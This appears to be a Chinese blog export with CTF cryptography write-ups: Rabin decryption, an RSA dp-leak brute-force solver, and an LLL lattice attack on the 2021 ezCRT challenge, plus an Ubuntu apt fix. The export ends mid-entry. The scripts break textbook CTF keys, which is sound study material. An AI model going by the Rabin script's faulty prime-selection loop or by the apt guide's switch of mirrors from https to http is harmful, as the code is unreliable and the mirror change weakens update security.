<h2 id="Rabin攻击脚本范例"><a href="#Rabin攻击脚本范例" class="headerlink" title="Rabin攻击脚本范例"></a>Rabin攻击脚本范例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> p % <span class="number">4</span> != <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> != <span class="number">3</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;Rabin_is_awersome&#125;&#x27;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">inv_p = invert(p, q)</span><br><span class="line">inv_q = invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p+<span class="number">1</span>)//<span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q+<span class="number">1</span>)//<span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">a = (inv_p*p*mq+inv_q*q*mp) % n</span><br><span class="line">b = n-a</span><br><span class="line">c = (inv_p*p*mq-inv_q*q*mp) % n</span><br><span class="line">d = n-c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(d))</span><br></pre></td></tr></table></figure>

<h2 id="Square-roots-modulo-a-prime"><a href="#Square-roots-modulo-a-prime" class="headerlink" title="Square roots modulo a prime"></a>Square roots modulo a prime</h2><p>那么问题来了，为什么一定要满足$p\equiv q\equiv 3(mod\ 4)$呢？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210901113636410.png" alt="image-20210901113636410"></p>
<p>可以看到主要是这个$u_0$在作祟，最后一句没有看懂</p>
<p>那我们应该怎么办呢？</p>
<p>论文还是看不懂啊，勉强看到三分之一，还是最简单的部分，梁子先结下了，后续补充</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>Rabin攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu软件更新失败解决</title>
    <url>/posts/ade40a32/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="ubuntu软件更新失败解决"><a href="#ubuntu软件更新失败解决" class="headerlink" title="ubuntu软件更新失败解决"></a>ubuntu软件更新失败解决</h1><p>才知道之前那么多次<code>apt update</code>一直是失败，报这样的错</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003101535464.png" alt="image-20211003101535464" style="zoom: 80%;" />

<p>此外还会报<code>Certificate verification failed: The certificate is NOT trusted.</code>的错误</p>
<p>具体原因没有深究，可能是源的问题</p>
<ul>
<li><p><strong>证书问题</strong></p>
<p>直接编辑源的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>将<code>https</code>替换成<code>http</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p>进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>

<p>安装证书</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ca-certificates</span><br></pre></td></tr></table></figure>

<p>显然<code>http</code>是不安全的，所有的数据包都会被监听，但不知道为什么阿里源都是<code>http</code>；总之在成功过后，还是把<code>http</code>替换回<code>https</code></p>
<p>最后再进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
<li><p><strong>没有Release文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apt/sources.list.d</span><br></pre></td></tr></table></figure>

<p>删除这个文件，有别的文件，我也不知道可不可以删，反正我一般就是这个<br><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003102507534.png" alt="image-20211003102507534"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm fcitx-team-ubuntu-nightly-bionic.list</span><br></pre></td></tr></table></figure>

<p>最后更新一下，成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>ubuntu</category>
      </categories>
  </entry>
  <entry>
    <title>dp泄漏攻击</title>
    <url>/posts/6f8a7505/</url>
    <content><![CDATA[<p>20210203</p>
<p>终于看懂了大佬的博客，结合自己的思考过程，写下这篇博客，做好记录，以便再次遇到</p>
<span id="more"></span>

<h1 id="dp泄漏攻击"><a href="#dp泄漏攻击" class="headerlink" title="dp泄漏攻击"></a>dp泄漏攻击</h1><p>之前在buu上有刷到告诉dp和dq的，已经存了脚本</p>
<p>这次在ctfshow上刷到了funnyrsa3只告诉dp，网上有wp也写得清楚易懂，还有脚本，所以重要的是弄清原理<br>首先，</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br></pre></td></tr></table></figure>

<p>很简单只告诉了四个数字，RSA加密解密的式子就不再赘述<br>这里dp的意思就是<br>$dp＝d\ \%(p-1)$<br>这是唯一的已知条件吧，所以就从这里开始推导<br>目标很明确，要么求p，要么求d，因为求出p一切就都出来了，所以我们试着能不能求出有关p的范围来尝试爆破<br>在这里提醒一点吧，一些做ctf密码学的萌新（比如我），总想着可以直接求出p的值来，但题目往往是让我们求得某个值的范围，然后用脚本爆破</p>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>以上是完整的推导过程，这里讲解下思路</p>
<p>其实就是将$dp＝d\ %(p-1)$ 转化成一般代数的形式$d=k1\times(p-1)+dp$ </p>
<p>由于d和p是要求的未知量，所以我们就想去掉一个</p>
<p>结合已知的求逆元式子$e\times d\equiv1\ mod\ \phi(n)$ 换成的$e\times d=k2\times \phi(n)+1\quad②$</p>
<p>那我们把$①\times e$，得到和②左边一样的，右边等起来就是$k1\times e\times (p-1)+dp\times e=k2\times \phi(n)+1$ 显然这里 $\phi n=(p-1)\times (q-1)$ 就不用说了</p>
<p>将这个式子整理得到$dp\times e=(k2\times (q-1)-k1\times e)(p-1)+1 ③$<br>（因为e和dp是已知的我们就放在一边，另外两项都有公因式（p-1）可以合并）</p>
<p>右边的+1暂且不看，因为无伤大雅</p>
<p>为什么说由题易知，$dp&gt;p-1$ </p>
<p>因为最开始我们就知道$dp\equiv d\ mod(p-1)$ 即$d=dp\ mod(p-1)$ </p>
<p>如果$dp&lt;p-1$(这里我还是没有搞得特别清除，等我弄懂了以后再来吧) </p>
<p>那么d的值就是dp，我们可以去检验一下，发现出来的是乱码，所以显然$dp&gt;p-1$ </p>
<p>所以我们设$X=[k1\times e+k2\times (q-1)],\quad X&lt;e$ </p>
<p>剩下的我们只需要编写脚本，爆破 $[1,e]$ 所有的情况，求出q，符合RSA基本要素之间的关系的就是我们要求的q</p>
<p>之后便是最基本的操作</p>
<h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>最后贴上自己的脚本，可能算不上很精炼，因为菜是一种原罪</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/2/3 13:59</span></span><br><span class="line"><span class="comment"># @Author : Will</span></span><br><span class="line"><span class="comment"># @File : funnyrsa3(script).py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">esayrsa</span>(<span class="params">n, p, e, c</span>):</span></span><br><span class="line">    q = n//p</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = invert(e, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># e * dp == (p-1) * X + 1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == (e*dp-<span class="number">1</span>) % X:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>) // X + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n % p:</span><br><span class="line">            flag = esayrsa(n, p, e, c)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结，不太难的推导，对于刚入门的萌新（wo）来说也有一定的收获吧，希望对自己有用，大家有帮助XD</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>RSA</category>
      </categories>
      <tags>
        <tag>dp泄漏攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>【2021红明谷 ezCRT】看格</title>
    <url>/posts/377b2f28/</url>
    <content><![CDATA[<p>红明谷的仅此于签到题的题，没做出来非常可惜</p>
<span id="more"></span>

<h1 id="2021红明谷-ezCRT"><a href="#2021红明谷-ezCRT" class="headerlink" title="[2021红明谷] ezCRT"></a>[2021红明谷] ezCRT</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_flag</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nl = []</span><br><span class="line">el = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">5</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.next_prime(bytes_to_long(flag))</span><br><span class="line">    e = gmpy2.invert(d, phi)</span><br><span class="line">    nl.append(n)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(nl)</span><br><span class="line"><span class="built_in">print</span>(el)</span><br><span class="line"></span><br><span class="line">cl = []</span><br><span class="line">flag = shuffle_flag(flag.decode()).encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nl)):</span><br><span class="line">    cl.append(<span class="built_in">pow</span>(bytes_to_long(flag), el[i], nl[i]))</span><br><span class="line"><span class="built_in">print</span>(cl)</span><br></pre></td></tr></table></figure>

<h2 id="老师和我的解题思路"><a href="#老师和我的解题思路" class="headerlink" title="老师和我的解题思路"></a>老师和我的解题思路</h2><p>这不是简简单单的crt吗，岂不是造一个ml，然后sage一把梭？推导手写</p>
<img alt="【2021红明谷】ezCRT-d52d16d0.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-d52d16d0.png" width="" height="" >
代码:

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, next_prime</span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line">d = next_prime(bytes_to_long(flag))</span><br><span class="line">nl = [<span class="number">92568419674731290088321621356482160506897805615722568594108449347104924357404183476911642777855820991398881156764068184840768873749718093598712551142529474514837161712525386555067489900887826033760157015587905876891826276883359425048106383489316555600680137377034136599761900203863336332834524981581608546277</span>, <span class="number">156396473818563541024482014372866929605198443382524196879362284224099117401220679011156723462510565131555949471059964179767945960498473012008220045105490122503438703770112687917922899337041421537937431868908340506324082719417747902320117904166584374628828367801012533926776313544525573302674702867896838756349</span>, <span class="number">158394833243620345170313957479796081390446308753163267294427471181012679879060921676287361174926310080500003540773261012005682050743188110335872216992843352902160171999286576526304619756655278142788064189969927027027650043645613441449926633380809295720977302961310978360575684689811662689798196832145977450067</span>, <span class="number">160088237013152996062303719345275590040820298863729670660621544625451638541931139026114480452748397901155923890465415946150076272684251867169893163248736673419035618274961179288085209456220719404244194802327491684233804878013160262798831738441790443743813368173495029170393018727204042599457829167334217403039</span>, <span class="number">176125361422384852665447804150030174008849487020728296169340093618559367127086381778331613043595010796295772394708222184703701230685609172767761426620379001062695169120599393984950488304290958534830276649464003949555105491117656796777657620812669612752464591728873199832200616338112460100967288829163217253937</span>]</span><br><span class="line">el = [<span class="number">69312028009355287369151190914681978515224902099126626288106202481561083869512381976466800912049172557479956400189281179789850182367192324370292880508005951892909864237831856642160554901550928757105750738313195248541515727624216048436593804176317465366380022764459799506858495981817822670957526705611211712923</span>, <span class="number">75652848678989239962391202584125835503829570694373189157636155436633908234362973839251550542975725789188895010096917574118924190081886365041870173203566890015476761857546914959928731140619341634983144909962106759048918025248827973161384045263311189477657141886093632791593341193393085433749877270828641736687</span>, <span class="number">33787880341418355427411601538315129862488529656310145182009801227014512555036822623215545927750632031483856865027938518144081751233475248361490189179988637342429805607352670543555743822390555949569061340741015073482051059972283793490798701339277926430357560613555427570475360496737455291914090967005368044847</span>, <span class="number">45894271603047945281790624112313938740541711331584775481261776728213544262108835859642003140814571796838418889270625806159755478669858113687476417240730385707171289922064965084283027730393146219788228689778873266618663473231744646293406030907691363263939114550226424730102211751706087680590823466426973879111</span>, <span class="number">39462780066564051085365889083337472288277223628014907704844994419242541623368920096395581667207909872944692627394665038729398405841875334128211337544205143876652949004817962123951132753801707134333132359039376283331685997619531570270269964807335633423631078057345827010794671894948828680193958561375351954627</span>]</span><br><span class="line">cl = [<span class="number">706565317398633346290694952311166623770389747503953970254889622211015097472765489676349936599997109100148837713409666075736711752497174928509516666210124850782396573268200919345005742905131769799719677758163730270857245509037860252700476102090438501579886321486095767737006847692632649652528793934802014895</span>, <span class="number">39976293505792731417500342473259466413746324373570160856607039564687056797068114044891309890160001547746290678089875953230720229396293686037539133378586045964793387433679304899158546834837314101138069400994334720071006048815998660691472991971598192116289517127819703723844842002711298154106615035755646791235</span>, <span class="number">82622936948791971063481195310587447614375265630407688161651173440160941964839173273115526802240672776681580169092371677673709037579318090622040018030730165371997331146171751228791524747622285256591779419274845659567001522182995468819720594650389854677582186770321424062935881407083956991646633760500152137305</span>, <span class="number">47924672523033740219454774309397006543851002473271747603676349322670782245519637286314088457132590816165876451615235937683074852920250584155682791595116359054889940842281324709426616771765312825842634237678243213350551342690870568516232078792788925700389762945955053433276153136302757700081859531596237286407</span>, <span class="number">157462720644970256050843434459828247139256140406409429896418317109064365936294939244159292550184482469972819258184119865598346921909220060266145241164734603316978286567811044606538176157224828857158099074286931716459626013079677895357212211176535500327064375073662684801175545519382470886239209020257096407424</span>]</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">M = <span class="number">0</span></span><br><span class="line">A = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">B = [<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">ml = [<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nl:</span><br><span class="line">    N *= i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    A[i] = N // nl[i]</span><br><span class="line">    B[i] = invert(A[i], nl[i])</span><br><span class="line">    ml[i] = <span class="built_in">int</span>(<span class="built_in">pow</span>(cl[i], d, nl[i]))</span><br><span class="line">    M += ml[i]*A[i]*B[i]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(M % N))</span><br></pre></td></tr></table></figure>

<p>结果出来这样的东西</p>
<img alt="【2021红明谷】ezCRT-97f67e73.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-97f67e73.png" width="" height="" >
一哩窝里GIAO
用sage验证过，还是一样

<img alt="【2021红明谷】ezCRT-40824712.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/【2021红明谷】ezCRT-40824712.png" width="" height="" >
而且一开始就感觉很奇怪，m明明很小的啊，也不会用到中国剩余定理，而且d已经知道了，那把d带进去试试，结果出来依旧是一堆乱码
绝逼有猫腻

<h2 id="剽来的解题思路"><a href="#剽来的解题思路" class="headerlink" title="剽来的解题思路"></a>剽来的解题思路</h2><p>从官方剽来的解题思路，果然要用到格<br>可以看出题目是共私钥的，五组$n,e,c$且私钥较小，那么翻译成数学表达式则为:</p>
<p>$\phi(n_i)=n_i-(p+q)+1$，令$-(p+q)+1=s_i$<br>$$<br>\begin{cases}<br>e_1d-k_1n_1=k_1s_1+1\\<br>e_2d-k_2n_2=k_2s_2+1\\<br>e_3d-k_3n_3=k_3s_3+1\\<br>e_4d-k_4n_4=k_4s_4+1\\<br>e_5d-k_5n_5=k_5s_5+1<br>\end{cases}<br>$$<br>就可以写成$A=(d,k_1,k_2,k_3,k_4,k_5)$</p>
<p>$B=\begin{pmatrix} M &amp; e_1 &amp; e_2 &amp;e_3&amp;e_4&amp;e_5\\0 &amp; -n_1 &amp; 0&amp;0&amp;0&amp;0\\0 &amp; 0 &amp;-n_2&amp;0&amp;0&amp;0\\0&amp;0&amp;0&amp;-n_3&amp;0&amp;0\\0&amp;0&amp;0&amp;0&amp;-n_4&amp;0\\0&amp;0&amp;0&amp;0&amp;0&amp;-n_5\end{pmatrix}$</p>
<p>$C=(dM,e_1d-k_1n_1,e_2d-k_2n_2,e_3d-k_3n_3,e_4d-k_4n_4,e_5d-k_5n_5)$</p>
<p>$AB=C$,其中$M=\sqrt n_1$,是为了调整范数，具体原因见lattice相关文章。对矩阵$B$.LLL()格约得到$C$，第一位除以$M$就是私钥$d$了；解出flag<br>求d脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, sqrt</span><br><span class="line">nl = [<span class="number">92568419674731290088321621356482160506897805615722568594108449347104924357404183476911642777855820991398881156764068184840768873749718093598712551142529474514837161712525386555067489900887826033760157015587905876891826276883359425048106383489316555600680137377034136599761900203863336332834524981581608546277</span>, <span class="number">156396473818563541024482014372866929605198443382524196879362284224099117401220679011156723462510565131555949471059964179767945960498473012008220045105490122503438703770112687917922899337041421537937431868908340506324082719417747902320117904166584374628828367801012533926776313544525573302674702867896838756349</span>, <span class="number">158394833243620345170313957479796081390446308753163267294427471181012679879060921676287361174926310080500003540773261012005682050743188110335872216992843352902160171999286576526304619756655278142788064189969927027027650043645613441449926633380809295720977302961310978360575684689811662689798196832145977450067</span>, <span class="number">160088237013152996062303719345275590040820298863729670660621544625451638541931139026114480452748397901155923890465415946150076272684251867169893163248736673419035618274961179288085209456220719404244194802327491684233804878013160262798831738441790443743813368173495029170393018727204042599457829167334217403039</span>, <span class="number">176125361422384852665447804150030174008849487020728296169340093618559367127086381778331613043595010796295772394708222184703701230685609172767761426620379001062695169120599393984950488304290958534830276649464003949555105491117656796777657620812669612752464591728873199832200616338112460100967288829163217253937</span>]</span><br><span class="line">el = [<span class="number">69312028009355287369151190914681978515224902099126626288106202481561083869512381976466800912049172557479956400189281179789850182367192324370292880508005951892909864237831856642160554901550928757105750738313195248541515727624216048436593804176317465366380022764459799506858495981817822670957526705611211712923</span>, <span class="number">75652848678989239962391202584125835503829570694373189157636155436633908234362973839251550542975725789188895010096917574118924190081886365041870173203566890015476761857546914959928731140619341634983144909962106759048918025248827973161384045263311189477657141886093632791593341193393085433749877270828641736687</span>, <span class="number">33787880341418355427411601538315129862488529656310145182009801227014512555036822623215545927750632031483856865027938518144081751233475248361490189179988637342429805607352670543555743822390555949569061340741015073482051059972283793490798701339277926430357560613555427570475360496737455291914090967005368044847</span>, <span class="number">45894271603047945281790624112313938740541711331584775481261776728213544262108835859642003140814571796838418889270625806159755478669858113687476417240730385707171289922064965084283027730393146219788228689778873266618663473231744646293406030907691363263939114550226424730102211751706087680590823466426973879111</span>, <span class="number">39462780066564051085365889083337472288277223628014907704844994419242541623368920096395581667207909872944692627394665038729398405841875334128211337544205143876652949004817962123951132753801707134333132359039376283331685997619531570270269964807335633423631078057345827010794671894948828680193958561375351954627</span>]</span><br><span class="line">cl = [<span class="number">706565317398633346290694952311166623770389747503953970254889622211015097472765489676349936599997109100148837713409666075736711752497174928509516666210124850782396573268200919345005742905131769799719677758163730270857245509037860252700476102090438501579886321486095767737006847692632649652528793934802014895</span>, <span class="number">39976293505792731417500342473259466413746324373570160856607039564687056797068114044891309890160001547746290678089875953230720229396293686037539133378586045964793387433679304899158546834837314101138069400994334720071006048815998660691472991971598192116289517127819703723844842002711298154106615035755646791235</span>, <span class="number">82622936948791971063481195310587447614375265630407688161651173440160941964839173273115526802240672776681580169092371677673709037579318090622040018030730165371997331146171751228791524747622285256591779419274845659567001522182995468819720594650389854677582186770321424062935881407083956991646633760500152137305</span>, <span class="number">47924672523033740219454774309397006543851002473271747603676349322670782245519637286314088457132590816165876451615235937683074852920250584155682791595116359054889940842281324709426616771765312825842634237678243213350551342690870568516232078792788925700389762945955053433276153136302757700081859531596237286407</span>, <span class="number">157462720644970256050843434459828247139256140406409429896418317109064365936294939244159292550184482469972819258184119865598346921909220060266145241164734603316978286567811044606538176157224828857158099074286931716459626013079677895357212211176535500327064375073662684801175545519382470886239209020257096407424</span>]</span><br><span class="line">M = <span class="built_in">int</span>(sqrt(nl[<span class="number">0</span>]))</span><br><span class="line">A = matrix([[M, el[<span class="number">0</span>], el[<span class="number">1</span>], el[<span class="number">2</span>], el[<span class="number">3</span>], el[<span class="number">4</span>]],</span><br><span class="line">           [<span class="number">0</span>, -nl[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">2</span>], <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">3</span>], <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">4</span>]]])</span><br><span class="line">C = A.LLL()</span><br><span class="line">d = C[<span class="number">0</span>] // M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p>算出来的d是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = <span class="number">4035685915436099980994650889948556572401301700215759631583373002944008951077734389446917516925581134450058777751810063</span></span><br></pre></td></tr></table></figure>

<p>之前的脚本没白写<br>脚本：</p>
